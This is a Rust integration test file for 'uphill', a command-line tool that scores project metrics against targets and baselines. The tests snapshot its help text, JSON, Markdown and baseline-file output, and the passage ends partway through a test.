//! Runs the `uphill` binary as a consumer does and checks its output and exit codes. Project
//! tests copy a fixture from `tests/fixtures/` into a temporary directory and run real scripts.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::time::{Duration, Instant};

use tempfile::TempDir;

fn uphill(args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_uphill"))
        .args(args)
        .output()
        .expect("the uphill binary runs")
}

/// Runs `uphill` with `args` from `cwd`.
fn uphill_in(cwd: &Path, args: &[&str], envs: &[(&str, &Path)]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_uphill"))
        .args(args)
        .current_dir(cwd)
        .envs(envs.iter().copied())
        .output()
        .expect("the uphill binary runs")
}

/// Runs `uphill check` from `cwd`.
fn check(cwd: &Path, envs: &[(&str, &Path)]) -> Output {
    uphill_in(cwd, &["check"], envs)
}

/// Copies the fixture project `name` into a new temporary directory.
fn fixture(name: &str) -> TempDir {
    copied(
        &Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures")
            .join(name),
    )
}

/// Copies the example `name` to `examples/<name>` in a temporary directory, beside a copy of
/// `packs/` that its `../../packs` entries name, and returns the directory and the example.
fn example(name: &str) -> (TempDir, PathBuf) {
    let repo = Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path().join("examples").join(name);
    for (from, to) in [
        (repo.join("examples").join(name), &project),
        (repo.join("packs"), &dir.path().join("packs")),
    ] {
        fs::create_dir_all(to).unwrap();
        copy(&from, to);
    }
    git(&project, &["init", "-q"]);
    git(&project, &["add", "."]);
    if project.join("package.json").exists() {
        let install = Command::new("bun")
            .args(["install", "--frozen-lockfile"])
            .current_dir(&project)
            .output()
            .expect("bun runs");
        assert!(install.status.success(), "{}", stderr(&install));
    }
    (dir, project)
}

fn copied(project: &Path) -> TempDir {
    let dir = tempfile::tempdir().unwrap();
    copy(project, dir.path());
    dir
}

/// Copies a project, leaving out installed packages, build output, and reports from earlier runs.
fn copy(from: &Path, to: &Path) {
    for entry in fs::read_dir(from).unwrap() {
        let entry = entry.unwrap();
        if [".uphill", "node_modules", "target"].contains(&entry.file_name().to_str().unwrap()) {
            continue;
        }
        let target = to.join(entry.file_name());

        if entry.file_type().unwrap().is_dir() {
            fs::create_dir(&target).unwrap();
            copy(&entry.path(), &target);
        } else {
            fs::copy(entry.path(), target).unwrap();
        }
    }
}

/// Copies the fixture project `name` into a new Git repository with one commit.
fn repository(name: &str) -> TempDir {
    let dir = fixture(name);
    git(dir.path(), &["init", "-q", "-b", "main"]);
    commit(dir.path());
    dir
}

/// Commits every change in the repository at `dir`.
fn commit(dir: &Path) {
    git(dir, &["add", "-A"]);
    git(dir, &["commit", "-q", "-m", "change"]);
}

/// Runs Git in `dir` with a fixed identity and returns its standard output.
fn git(dir: &Path, args: &[&str]) -> String {
    let output = Command::new("git")
        .args([
            "-c",
            "user.name=Uphill",
            "-c",
            "user.email=uphill@example.com",
        ])
        .args(args)
        .current_dir(dir)
        .output()
        .expect("git runs");
    assert!(output.status.success(), "{}", stderr(&output));
    stdout(&output)
}

/// Runs `uphill --compare HEAD` in `dir`, and returns its output with the commit hash masked.
fn compare_head(dir: &Path, args: &[&str]) -> (Output, String) {
    let output = uphill_in(dir, &[&["--compare", "HEAD"], args].concat(), &[]);
    let text = masked(dir, &stdout(&output));
    (output, text)
}

/// Returns the `scores` of the comparison in the `report.json` of the project at `dir`.
fn scores(dir: &Path) -> String {
    let json = fs::read_to_string(dir.join(".uphill/report.json")).unwrap();
    let start = json.find("\"scores\"").unwrap();
    let end = start + json[start..].find("\"changes\"").unwrap();
    json[start..end].trim_end().to_owned()
}

/// Replaces the short hash of the commit at `HEAD` in `text` with `abc1234`.
fn masked(dir: &Path, text: &str) -> String {
    let short = git(dir, &["rev-parse", "--short", "HEAD"]);
    text.replace(short.trim(), "abc1234")
}

fn stdout(output: &Output) -> String {
    String::from_utf8_lossy(&output.stdout).into_owned()
}

fn stderr(output: &Output) -> String {
    String::from_utf8_lossy(&output.stderr).into_owned()
}

#[test]
fn version() {
    let long = uphill(&["--version"]);
    let short = uphill(&["-V"]);

    // `pnpm changeset:version` sets the version on each release.
    assert!(long.status.success());
    insta::assert_snapshot!(
        stdout(&long).replace(env!("CARGO_PKG_VERSION"), "[version]"),
        @"[version]"
    );
    assert_eq!(stdout(&short), stdout(&long));
}

#[test]
fn help() {
    let output = uphill(&["--help"]);

    assert!(output.status.success());
    // `pnpm changeset:version` sets the version on each release.
    insta::assert_snapshot!(stdout(&output).replace(env!("CARGO_PKG_VERSION"), "[version]"), @"
    uphill@[version] — Score metrics against their targets and compare them with their baselines

    Usage: uphill [category] [options] | <command>

    Arguments:
      category  Run only this category

    Options:
      --compact           Print the scores, missed targets, and opportunities in a few lines
      --compare <string>  Compare with another revision: timings in interleaved pairs, and sizes, counts, and checks with its baselines
      --note              Keep this run as a Git note on HEAD, for trends and `uphill log`
      --require-baseline  Exit with status 1 when anything differs from the baselines
      --require-targets   Exit with status 1 when a metric misses its target or a script fails
      --update            Write this run's sizes, counts, checks, and line targets to the baseline file

    Runs each category's script, scores its metrics, lists the opportunities that would raise the scores most, and compares sizes, counts, checks, and line targets with each metric's baseline. Reads uphill.yaml or uphill.toml, at the root, in .agents, or in .agents/uphill, from this directory or the nearest parent. Writes .uphill/report.json, report.md, report.html, and comment.md.

    Commands:
      add        Pin a pack to a commit and list it in the configuration: owner/repo/path on GitHub, an https URL followed by //path, or a local ./path, with an optional @ref
      blame      Name the commit that last moved a metric: from its baselines, or by measuring commits since <ref>, or every commit, in temporary checkouts and bisecting
      check      Run each script once and check the metric lines it writes
      dashboard  Write .uphill/dashboard.html from the latest noted runs of each repository: a Git URL, a local path, or owner/name on GitHub
      init       Print a brief for an agent to set up Uphill in this project
      log        List the commits that changed a metric's baseline, or the runs noted for it
      remove     Remove a pack from the configuration
      rules      Print each metric's rule and targets, for an agent to follow while it writes code
      update     Move each remote pack, or the named ones, to the newest commit of the ref it follows

    Integrations:
      completions  Generate shell completion script
      skills       Sync skill files to agents (add, list)

    Global Options:
      --filter-output <keys>              Filter output by key paths (e.g. foo,bar.baz,a[0,3])
      --format <toon|json|yaml|md|jsonl>  Output format
      --full-output                       Show full output envelope
      --help                              Show help
      --llms, --llms-full                 Print LLM-readable manifest
      --schema                            Show JSON Schema for command
      --token-count                       Print token count of output (instead of output)
      --token-limit <n>                   Limit output to n tokens
      --token-offset <n>                  Skip first n tokens of output
      --version                           Show version
    ");
}

#[test]
fn unknown_argument() {
    let output = uphill(&["--nope"]);

    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @r#"
    code: UNKNOWN
    message: "Unknown flag: --nope"
    "#);
}

#[test]
fn unknown_check_argument() {
    let output = uphill(&["check", "--fast"]);

    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @r#"
    code: UNKNOWN
    message: "Unknown flag: --fast"
    "#);
}

#[test]
fn scores_every_category_and_writes_reports() {
    let project = fixture("scored");

    let output = uphill_in(project.path(), &[], &[]);

    assert_eq!(output.status.code(), Some(0));
    insta::assert_snapshot!(stdout(&output), @"
    ▲  42  footprint
      ▲   3  bundle       27.5 kB                   target 5 kB
                          includes all of lodash
      ■  57  export-size  p90 9 kB (viem/op-stack)  target 5 kB
                          10 kB  viem/chains
                                 bundles every chain definition
                          9 kB   viem/op-stack
                          8 kB   viem/utils
          –  modules      412
      ■  67  links        2 of 3 pass
                          fail  about.html
                                links to /team, which is gone

    ■  75  speed  median of 5 rounds
      ▲  33  render      p90 5 ms (parse)  target 2 ms
                         5 ms  parse
                         2 ms  encode
      ●  96  throughput  2588              target 2000, weight 2

    Opportunities
      +29  footprint  bundle                     27.5 kB → 5 kB
      +19  speed      render parse               5 ms → 2 ms
      +11  footprint  links about.html           fail → pass
      +3   footprint  export-size viem/chains    10 kB → 5 kB
      +3   footprint  export-size viem/op-stack  9 kB → 5 kB

    No baseline yet. Run `uphill --update` to record these values as the baseline.

    Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html
    ");

    let json = fs::read_to_string(project.path().join(".uphill/report.json")).unwrap();
    insta::assert_snapshot!(json, @r#"
    {
      "version": 1,
      "score": 59,
      "categories": [
        {
          "name": "footprint",
          "title": "Footprint",
          "subject": null,
          "description": null,
          "score": 42,
          "rounds": 1,
          "metrics": [
            {
              "name": "bundle",
              "title": "Bundle",
              "description": null,
              "kind": "size",
              "unit": "B",
              "value": 27500,
              "item": null,
              "score": 3,
              "target": 5000,
              "default": 5000,
              "note": "includes all of lodash",
              "better": "lower",
              "weight": 1,
              "rollup": "p90",
              "items": []
            },
            {
              "name": "export-size",
              "title": "Export size",
              "description": null,
              "kind": "size",
              "unit": "B",
              "value": 9000,
              "item": "viem/op-stack",
              "score": 57,
              "target": 5000,
              "default": 5000,
              "note": null,
              "better": "lower",
              "weight": 1,
              "rollup": "p90",
              "items": [
                {
                  "name": "viem/chains",
                  "value": 10000,
                  "target": null,
                  "note": "bundles every chain definition"
                },
                {
                  "name": "viem/op-stack",
                  "value": 9000,
                  "target": null,
                  "note": null
                },
                {
                  "name": "viem/utils",
                  "value": 8000,
                  "target": null,
                  "note": null
                },
                {
                  "name": "viem/zksync",
                  "value": 7000,
                  "target": null,
                  "note": null
                },
                {
                  "name": "viem/window",
                  "value": 6000,
                  "target": null,
                  "note": null
                },
                {
                  "name": "viem/siwe",
                  "value": 5000,
                  "target": null,
                  "note": null
                },
                {
                  "name": "viem/ens",
                  "value": 4000,
                  "target": null,
                  "note": null
                },
                {
                  "name": "viem/actions",
                  "value": 3000,
                  "target": null,
                  "note": null
                },
                {
                  "name": "viem/accounts",
                  "value": 2000,
                  "target": null,
                  "note": null
                },
                {
                  "name": "viem",
                  "value": 1000,
                  "target": null,
                  "note": null
                }
              ]
            },
            {
              "name": "modules",
              "title": "Modules",
              "description": null,
              "kind": "count",
              "unit": null,
              "value": 412,
              "item": null,
              "score": null,
              "target": null,
              "default": null,
              "note": null,
              "better": "lower",
              "weight": 1,
              "rollup": "p90",
              "items": []
            },
            {
              "name": "links",
              "title": "Links",
              "description": null,
              "kind": "check",
              "unit": null,
              "value": 0.6666666666666666,
              "item": null,
              "score": 67,
              "target": null,
              "default": null,
              "note": null,
              "better": "lower",
              "weight": 1,
              "rollup": null,
              "items": [
                {
                  "name": "about.html",
                  "value": false,
                  "target": null,
                  "note": "links to /team, which is gone"
                },
                {
                  "name": "index.html",
                  "value": true,
                  "target": null,
                  "note": null
                },
                {
                  "name": "blog/first post.html",
                  "value": true,
                  "target": null,
                  "note": null
                }
              ]
            }
          ]
        },
        {
          "name": "speed",
          "title": "Speed",
          "subject": null,
          "description": null,
          "score": 75,
          "rounds": 5,
          "metrics": [
            {
              "name": "render",
              "title": "Render",
              "description": null,
              "kind": "time",
              "unit": "ns",
              "value": 5000000,
              "item": "parse",
              "score": 33,
              "target": 2000000,
              "default": 2000000,
              "note": null,
              "better": "lower",
              "weight": 1,
              "rollup": "p90",
              "items": [
                {
                  "name": "parse",
                  "value": 5000000,
                  "target": null,
                  "note": null
                },
                {
                  "name": "encode",
                  "value": 2000000,
                  "target": null,
                  "note": "reuses one buffer"
                }
              ]
            },
            {
              "name": "throughput",
              "title": "Throughput",
              "description": null,
              "kind": "count",
              "unit": null,
              "value": 2588,
              "item": null,
              "score": 96,
              "target": 2000,
              "default": 2000,
              "note": null,
              "better": "higher",
              "weight": 2,
              "rollup": "p10",
              "items": []
            }
          ]
        }
      ],
      "opportunities": [
        {
          "category": "footprint",
          "subject": null,
          "metric": "bundle",
          "item": null,
          "items": 1,
          "value": 27500,
          "target": 5000,
          "gain": 29
        },
        {
          "category": "speed",
          "subject": null,
          "metric": "render",
          "item": "parse",
          "items": 1,
          "value": 5000000,
          "target": 2000000,
          "gain": 19
        },
        {
          "category": "footprint",
          "subject": null,
          "metric": "links",
          "item": "about.html",
          "items": 1,
          "value": false,
          "target": true,
          "gain": 11
        },
        {
          "category": "footprint",
          "subject": null,
          "metric": "export-size",
          "item": "viem/chains",
          "items": 1,
          "value": 10000,
          "target": 5000,
          "gain": 3
        },
        {
          "category": "footprint",
          "subject": null,
          "metric": "export-size",
          "item": "viem/op-stack",
          "items": 1,
          "value": 9000,
          "target": 5000,
          "gain": 3
        }
      ],
      "changes": null,
      "comparison": null
    }
    "#);

    let markdown = fs::read_to_string(project.path().join(".uphill/report.md")).unwrap();
    insta::assert_snapshot!(markdown, @"
    # Hill climb report

    | Category | Score |
    | --- | --- |
    | Footprint | ▲ 42 |
    | Speed | ■ 75 |

    ## Opportunities

    | Gain | Category | Change | Value | Target |
    | --- | --- | --- | --- | --- |
    | +29 | Footprint | Bundle | 27.5 kB | 5 kB |
    | +19 | Speed | Render `parse` | 5 ms | 2 ms |
    | +11 | Footprint | Links `about.html` | fail | pass |
    | +3 | Footprint | Export size `viem/chains` | 10 kB | 5 kB |
    | +3 | Footprint | Export size `viem/op-stack` | 9 kB | 5 kB |

    ## Footprint

    | Score | Metric | Value | Target | Note |
    | --- | --- | --- | --- | --- |
    | ▲ 3 | Bundle | 27.5 kB | 5 kB | includes all of lodash |
    | ■ 57 | Export size | p90 9 kB (viem/op-stack) | 5 kB |  |
    | – | Modules | 412 |  |  |
    | ■ 67 | Links | 2 of 3 pass |  |  |

    Worst items of Export size:

    | Item | Value | Target | Note |
    | --- | --- | --- | --- |
    | viem/chains | 10 kB | 5 kB | bundles every chain definition |
    | viem/op-stack | 9 kB | 5 kB |  |
    | viem/utils | 8 kB | 5 kB |  |

    Failed items of Links:

    | Item | Value | Target | Note |
    | --- | --- | --- | --- |
    | about.html | fail |  | links to /team, which is gone |

    ## Speed

    Values that vary between runs are the median of 5 rounds.

    | Score | Metric | Value | Target |
    | --- | --- | --- | --- |
    | ▲ 33 | Render | p90 5 ms (parse) | 2 ms |
    | ● 96 | Throughput | 2588 | 2000 |

    Worst items of Render:

    | Item | Value | Target | Note |
    | --- | --- | --- | --- |
    | parse | 5 ms | 2 ms |  |
    | encode | 2 ms | 2 ms | reuses one buffer |
    ");
}

#[test]
fn scores_one_category_from_a_subdirectory() {
    let project = fixture("scored");
    fs::create_dir(project.path().join("src")).unwrap();

    let output = uphill_in(&project.path().join("src"), &["footprint"], &[]);

    assert_eq!(output.status.code(), Some(0));
    insta::assert_snapshot!(stdout(&output), @"
    ▲  42  footprint
      ▲   3  bundle       27.5 kB                   target 5 kB
                          includes all of lodash
      ■  57  export-size  p90 9 kB (viem/op-stack)  target 5 kB
                          10 kB  viem/chains
                                 bundles every chain definition
                          9 kB   viem/op-stack
                          8 kB   viem/utils
          –  modules      412
      ■  67  links        2 of 3 pass
                          fail  about.html
                                links to /team, which is gone

    Opportunities
      +29  footprint  bundle                     27.5 kB → 5 kB
      +11  footprint  links about.html           fail → pass
      +3   footprint  export-size viem/chains    10 kB → 5 kB
      +3   footprint  export-size viem/op-stack  9 kB → 5 kB

    No baseline yet. Run `uphill --update` to record these values as the baseline.

    Wrote ../.uphill/report.json, ../.uphill/report.md, ../.uphill/report.html
    ");
}

#[test]
fn scoring_reports_failed_categories() {
    let project = fixture("failing");

    let output = uphill_in(project.path(), &[], &[]);

    assert_eq!(output.status.code(), Some(1));
    insta::assert_snapshot!(stdout(&output), @"
        –  footprint
          –  size  1 kB

    ✗ build  script exited with status 3
        build log line 6
        build log line 7
        build log line 8
        build log line 9
        build log line 10
        build log line 11
        build log line 12
        build log line 13
        build log line 14
        build log line 15
        build log line 16
        build log line 17
        build log line 18
        build log line 19
        build log line 20
        build log line 21
        build log line 22
        build log line 23
        build log line 24
        build log line 25

    ✗ crash  script was stopped by signal 9

    No baseline yet. Run `uphill --update` to record these values as the baseline.

    Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html
    ");

    // Failed categories drop out of the overall score instead of counting as zero, and footprint
    // has no score, so the project has none.
    let json = fs::read_to_string(project.path().join(".uphill/report.json")).unwrap();
    let overall = json.lines().find(|line| line.starts_with("  \"score\""));
    insta::assert_snapshot!(overall.unwrap(), @r#"  "score": null,"#);
}

#[test]
fn baselines_record_targets_and_gate_every_change() {
    let project = fixture("scored");
    let edit = |file: &str, from: &str, to: &str| {
        let path = project.path().join(file);
        let script = fs::read_to_string(&path).unwrap();
        assert!(script.contains(from), "{file} writes `{from}`");
        fs::write(&path, script.replace(from, to)).unwrap();
    };

    let missing = uphill_in(project.path(), &["footprint", "--require-baseline"], &[]);
    assert_eq!(missing.status.code(), Some(1));
    assert!(
        stdout(&missing).ends_with(
            "\n--require-baseline needs a baseline. Run `uphill --update` to record one\n"
        )
    );

    // The first update writes each item's value beside the target it scored against, from its
    // line or the default, and a timing's target without its value. One line per item.
    edit(
        "footprint.sh",
        "export-size viem 1kB\n",
        "export-size viem 1kB target 2kB\n",
    );
    edit(
        "speed.sh",
        "render encode 2ms",
        "render encode 2ms target 3ms",
    );
    let config = fs::read_to_string(project.path().join("uphill.yaml")).unwrap();
    let recorded = uphill_in(project.path(), &["--update"], &[]);

    // The configuration stays as people wrote it, and the baseline file keeps the declared order.
    assert_eq!(recorded.status.code(), Some(0));
    assert_eq!(
        fs::read_to_string(project.path().join("uphill.yaml")).unwrap(),
        config
    );
    let baselines = fs::read_to_string(project.path().join("uphill.baseline.yaml")).unwrap();
    insta::assert_snapshot!(baselines, @r#"
    # Each measurement's `baseline`, the size, count, or check `uphill --update` accepted, and its
    # `target`. Edit a target here, and each run reports what changed since the baseline.

    footprint:
      bundle: { baseline: 27.5kB, target: 5kB }
      export-size:
        "*": { target: 5kB }
        viem: { baseline: 1kB, target: 2kB }
        viem/accounts: { baseline: 2kB }
        viem/actions: { baseline: 3kB }
        viem/chains: { baseline: 10kB }
        viem/ens: { baseline: 4kB }
        viem/op-stack: { baseline: 9kB }
        viem/siwe: { baseline: 5kB }
        viem/utils: { baseline: 8kB }
        viem/window: { baseline: 6kB }
        viem/zksync: { baseline: 7kB }
      modules: { baseline: 412 }
      links:
        "*": { baseline: pass }
        about.html: { baseline: fail }

    speed:
      render:
        "*": { target: 2ms }
        encode: { target: 3ms }
      throughput: { baseline: 2588, target: 2000 }
    "#);

    // An improvement alone fails the gate until it is accepted, so it becomes the new floor.
    edit(
        "footprint.sh",
        "links about.html fail",
        "links about.html pass",
    );
    let improved = uphill_in(project.path(), &["footprint", "--require-baseline"], &[]);

    assert_eq!(improved.status.code(), Some(1));
    assert!(stdout(&improved).ends_with(
        "
Since the baseline
  better  footprint  links about.html  fail → pass

Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html

1 change since the baseline. Run `uphill --update` to accept it
"
    ));
    let accepted = uphill_in(project.path(), &["footprint", "--update"], &[]);
    assert_eq!(accepted.status.code(), Some(0));

    // Updating again from the same code leaves the baseline file as it is.
    let baselines = fs::read_to_string(project.path().join("uphill.baseline.yaml")).unwrap();
    let again = uphill_in(project.path(), &["footprint", "--update"], &[]);
    assert_eq!(again.status.code(), Some(0));
    assert_eq!(
        fs::read_to_string(project.path().join("uphill.baseline.yaml")).unwrap(),
        baselines
    );

    edit(
        "footprint.sh",
        "export-size viem/chains 10kB",
        "export-size viem/chains 12kB",
    );
    edit(
        "footprint.sh",
        "export-size viem/window 6kB\n",
        "export-size viem/tempo 4kB\n",
    );
    // The baseline file's own target has the final say: a script that loosens its line target
    // changes nothing, and a target edited in the file scores at once.
    edit(
        "footprint.sh",
        "export-size viem 1kB target 2kB",
        "export-size viem 1kB target 3kB",
    );
    edit(
        "uphill.baseline.yaml",
        "    viem/chains: { baseline: 10kB }\n",
        "    viem/chains: { baseline: 10kB, target: 15kB }\n",
    );
    // A new link that passes matches the default record, so only the new failing link changes.
    // A passing link that is gone leaves no record to compare with.
    edit(
        "footprint.sh",
        "links index.html pass\n",
        "links contact.html pass\nlinks team.html fail\n",
    );
    let baselines = fs::read_to_string(project.path().join("uphill.baseline.yaml")).unwrap();
    let gated = uphill_in(project.path(), &["footprint", "--require-baseline"], &[]);

    assert_eq!(gated.status.code(), Some(1));
    insta::assert_snapshot!(stdout(&gated), @"
    ▲  48  footprint
      ▲   3  bundle       27.5 kB                target 5 kB
                          includes all of lodash
      ■  66  export-size  p90 8 kB (viem/utils)  target 5 kB
                          9 kB  viem/op-stack
                          8 kB  viem/utils
                          7 kB  viem/zksync
          –  modules      412
      ■  75  links        3 of 4 pass
                          fail  team.html

    Opportunities
      +29  footprint  bundle                     27.5 kB → 5 kB
      +8   footprint  links team.html            fail → pass
      +3   footprint  export-size viem/op-stack  9 kB → 5 kB
      +3   footprint  export-size viem/utils     8 kB → 5 kB

    Since the baseline
      worse  footprint  export-size viem/chains  10 kB → 12 kB
      worse  footprint  links team.html          pass → fail
      new    footprint  export-size viem/tempo   4 kB
      gone   footprint  export-size viem/window  6 kB

    Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html

    4 changes since the baseline. Run `uphill --update` to accept them
    ");

    // Accepting the changes rewrites only the lines of the items that changed.
    let accepted = uphill_in(project.path(), &["footprint", "--update"], &[]);
    assert_eq!(accepted.status.code(), Some(0));
    let expected = baselines
        .replace(
            "    viem/chains: { baseline: 10kB, target: 15kB }\n",
            "    viem/chains: { baseline: 12kB, target: 15kB }\n",
        )
        .replace(
            "    viem/siwe: { baseline: 5kB }\n",
            "    viem/siwe: { baseline: 5kB }\n    viem/tempo: { baseline: 4kB }\n",
        )
        .replace("    viem/window: { baseline: 6kB }\n", "")
        .replace(
            "    \"*\": { baseline: pass }\n",
            "    \"*\": { baseline: pass }\n    team.html: { baseline: fail }\n",
        );
    assert_eq!(
        fs::read_to_string(project.path().join("uphill.baseline.yaml")).unwrap(),
        expected
    );
}

#[test]
fn checks_record_a_default_and_read_the_older_format() {
    let project = repository("checks");
    let dir = project.path();
    let commit_on = |date: &str, title: &str| {
        git(dir, &["add", "-A"]);
        git(dir, &["commit", "-q", "-m", title, "--date", date]);
    };
    git(
        dir,
        &[
            "commit",
            "-q",
            "--amend",
            "-m",
            "chore: list every check",
            "--date",
            "2026-01-01T12:00:00",
        ],
    );
    let lines = |from: &str, to: &str| {
        let text = fs::read_to_string(dir.join("lines.txt")).unwrap();
        assert!(text.contains(from), "lines.txt writes `{from}`");
        fs::write(dir.join("lines.txt"), text.replace(from, to)).unwrap();
    };

    // The older format, with one record per item, gates the same checks.
    let older = uphill_in(dir, &["--require-baseline"], &[]);
    assert_eq!(older.status.code(), Some(0), "{}", stdout(&older));
    // Checks that vary still run once, since a check has no median.
    assert_eq!(fs::read_to_string(dir.join(".runs")).unwrap(), "run\n");
    fs::remove_file(dir.join(".runs")).unwrap();

    // A tie between `pass` and `skip` goes to `pass`, and the commits that vary record nothing.
    let updated = uphill_in(dir, &["--update"], &[]);
    assert_eq!(updated.status.code(), Some(0));
    let baselines = fs::read_to_string(dir.join("uphill.baseline.yaml")).unwrap();
    insta::assert_snapshot!(baselines, @r#"
    # Each measurement's `baseline`, the size, count, or check `uphill --update` accepted, and its
    # `target`. Edit a target here, and each run reports what changed since the baseline.

    style:
      lint:
        "*": { baseline: pass }
        c.ts: { baseline: fail }
        d.ts: { baseline: skip }
        e.ts: { baseline: skip }
    "#);
    commit_on("2026-01-02T12:00:00", "chore: record a default");

    // A new item that passes matches the default, and a new commit records nothing. The older
    // format at the previous commit has no default, so the new item is new there.
    lines("lint b.ts pass\n", "lint b.ts pass\nlint f.ts pass\n");
    lines(
        "commits abc1234 pass",
        "commits abc1234 pass\ncommits def5678 fail",
    );
    let gated = uphill_in(dir, &["--require-baseline"], &[]);
    assert_eq!(gated.status.code(), Some(0), "{}", stdout(&gated));
    for (revision, expected) in [
        ("HEAD", "\nNo changes against "),
        ("HEAD~1", "\n  new  style  lint f.ts  pass\n\n"),
    ] {
        let compared = uphill_in(dir, &["--compare", revision], &[]);
        assert_eq!(compared.status.code(), Some(0));
        assert!(
            stdout(&compared).contains(expected),
            "{}",
            stdout(&compared)
        );
    }

    // A new item that skips differs from the default, and so does a listed item that is gone.
    lines("lint c.ts fail note \"uses any\"\n", "lint g.ts skip\n");
    let changed = uphill_in(dir, &["--require-baseline"], &[]);
    assert_eq!(changed.status.code(), Some(1));
    let start = stdout(&changed).find("Since the baseline").unwrap();
    insta::assert_snapshot!(stdout(&changed)[start..], @"
    Since the baseline
      gone  style  lint g.ts  pass → skip
      gone  style  lint c.ts  fail

    Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html

    2 changes since the baseline. Run `uphill --update` to accept them
    ");

    // The history of an item reads both formats, so the move to a default moves nothing.
    lines("lint a.ts pass", "lint a.ts fail");
    uphill_in(dir, &["--update"], &[]);
    commit_on("2026-01-03T12:00:00", "feat: break a.ts");
    let log = uphill_in(dir, &["log", "style", "lint", "a.ts"], &[]);
    assert_eq!(log.status.code(), Some(0), "{}", stderr(&log));
    let hashes = git(dir, &["log", "--reverse", "--format=%h"]);
    let named = hashes
        .lines()
        .enumerate()
        .fold(stdout(&log), |text, (index, hash)| {
            text.replace(hash, &format!("commit{}", index + 1))
        });
    insta::assert_snapshot!(named, @"
    style lint a.ts in the baselines of uphill.baseline.yaml

      commit3  2026-01-03  fail  from pass  feat: break a.ts
      commit1  2026-01-01  pass             chore: list every check
    ");
}

#[test]
fn subjects_share_one_run_and_score_on_their_own() {
    let project = fixture("subjects");

    let output = uphill_in(project.path(), &["--update"], &[]);

    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    // Both categories come from the same 5 runs: the startup times repeat the script.
    let runs = fs::read_to_string(project.path().join("runs.txt")).unwrap();
    assert_eq!(runs.lines().count(), 5);
    insta::assert_snapshot!(stdout(&output), @"
    ● 100  zc: speed  median of 5 rounds
      ● 100  startup  1 ms  target 30 ms

    ● 100  zc: footprint  median of 5 rounds
      ● 100  turn-rss      3 MB  target 16 MB
      ● 100  install-size  2 MB  target 10 MB

    ■  77  ts: speed  median of 5 rounds
      ■  77  startup  40 ms  target 30 ms

    ●  97  ts: footprint  median of 5 rounds
      ●  94  turn-rss      48 MB   target 57 MB
      ● 100  install-size  4 MB    target 10 MB
      ●  97  wasm-size     250 kB  target 350 kB

    Opportunities
      +13  ts: speed  startup  40 ms → 30 ms

    Since the baseline
      looser  ts: footprint  turn-rss      target 16 MB → 57 MB
      new     zc: footprint  install-size
      new     ts: footprint  install-size
      new     ts: footprint  wasm-size

    Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html, uphill.baseline.yaml, uphill.yaml
    ");

    // Each subject records its values and targets. zc's peak memory varies, so it records only
    // its target, and ts keeps its line's target.
    let baselines = fs::read_to_string(project.path().join("uphill.baseline.yaml")).unwrap();
    insta::assert_snapshot!(baselines, @r#"
    # Each measurement's `baseline`, the size, count, or check `uphill --update` accepted, and its
    # `target`. Edit a target here, and each run reports what changed since the baseline.

    speed:
      startup: { target: 30ms }

    footprint:
      turn-rss:
        "*": { target: 16MB }
        ts: { target: 57MB }
      install-size:
        "*": { target: 10MB }
        zc: { baseline: 2MB }
        ts: { baseline: 4MB }
      wasm-size:
        "*": { target: 350kB }
        ts: { baseline: 250kB }
    "#);

    let markdown = fs::read_to_string(project.path().join(".uphill/report.md")).unwrap();
    insta::assert_snapshot!(markdown, @"
    # Hill climb report

    | Subject | Speed | Size and memory |
    | --- | --- | --- |
    | zc | ● 100 | ● 100 |
    | ts | ■ 77 | ● 97 |

    ## Opportunities

    | Gain | Category | Change | Value | Target |
    | --- | --- | --- | --- | --- |
    | +13 | ts: Speed | Startup | 40 ms | 30 ms |

    ## Changes since the baseline

    | Change | Category | Metric | Before | After |
    | --- | --- | --- | --- | --- |
    | looser | ts: Size and memory | Peak memory, one turn | target 16 MB | target 57 MB |
    | new | zc: Size and memory | Install size |  |  |
    | new | ts: Size and memory | Install size |  |  |
    | new | ts: Size and memory | Wasm size |  |  |

    ## zc: Speed

    Values that vary between runs are the median of 5 rounds.

    | Score | Metric | Value | Target |
    | --- | --- | --- | --- |
    | ● 100 | Startup | 1 ms | 30 ms |

    ## zc: Size and memory

    Values that vary between runs are the median of 5 rounds.

    | Score | Metric | Value | Target |
    | --- | --- | --- | --- |
    | ● 100 | Peak memory, one turn | 3 MB | 16 MB |
    | ● 100 | Install size | 2 MB | 10 MB |

    ## ts: Speed

    Values that vary between runs are the median of 5 rounds.

    | Score | Metric | Value | Target |
    | --- | --- | --- | --- |
    | ■ 77 | Startup | 40 ms | 30 ms |

    ## ts: Size and memory

    Values that vary between runs are the median of 5 rounds.

    | Score | Metric | Value | Target |
    | --- | --- | --- | --- |
    | ● 94 | Peak memory, one turn | 48 MB | 57 MB |
    | ● 100 | Install size | 4 MB | 10 MB |
    | ● 97 | Wasm size | 250 kB | 350 kB |
    ");

    // The overall score counts each subject of each category once: 100, 100, 77, and 97.
    let json = fs::read_to_string(project.path().join(".uphill/report.json")).unwrap();
    let overall = json.lines().find(|line| line.starts_with("  \"score\""));
    insta::assert_snapshot!(overall.unwrap(), @r#"  "score": 94,"#);

    // ts's peak memory is scored against its line target, and `default` keeps the metric's target.
    let metric = json.rfind("\"name\": \"turn-rss\"").unwrap();
    let start = metric + json[metric..].find("\"target\"").unwrap();
    let end = metric + json[metric..].find("\"note\"").unwrap();
    insta::assert_snapshot!(json[start..end], @r#"
    "target": 57000000,
              "default": 16000000,
    "#);

    // The page has a tab per subject, shows titles, and loads nothing from the network.
    let html = fs::read_to_string(project.path().join(".uphill/report.html")).unwrap();
    assert_eq!(html.matches("role=\"tab\"").count(), 2);
    assert!(html.contains(">zc</button>") && html.contains(">ts</button>"));
    assert!(html.contains("<h2>Size and memory</h2>"));
    assert!(html.contains("<span class=\"metric-title\">Peak memory, one turn</span>"));
    assert!(!html.contains("http://") && !html.contains("https://"));

